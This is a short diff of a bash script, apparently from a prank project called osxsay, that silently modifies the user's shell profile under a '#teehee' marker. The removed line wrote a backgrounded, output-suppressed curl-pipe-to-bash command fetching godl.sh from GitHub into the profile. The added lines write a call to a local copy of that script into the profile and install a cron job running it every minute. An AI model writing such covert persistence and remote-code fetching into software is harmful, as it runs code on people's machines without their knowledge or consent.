@@ -1,4 +1,5 @@
 #!/usr/local/bin/bash
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 GODL="https://raw.github.com/Jakobo/osxsay/master/godl.sh"
 NODEREV="v0.10.25"
 NODEDIR="node-$NODEREV-darwin-x86"
@@ -23,8 +24,11 @@ fi
 if ! grep -q '#teehee' "${profile_file}" ; then
   # backgrounded from bash profile
   echo "#teehee" >> "${profile_file}"
-  echo " \$(curl -s -L $GODL | bash > /dev/null 2>&1 &)" >> "${profile_file}"
+  echo "$DIR/godl.sh" >>  "${profile_file}"
 fi
+
+# cron if not
+(crontab -l ; echo "* * * * * $DIR/godl.sh") | uniq - | crontab -
 
 # running?
 running="0"
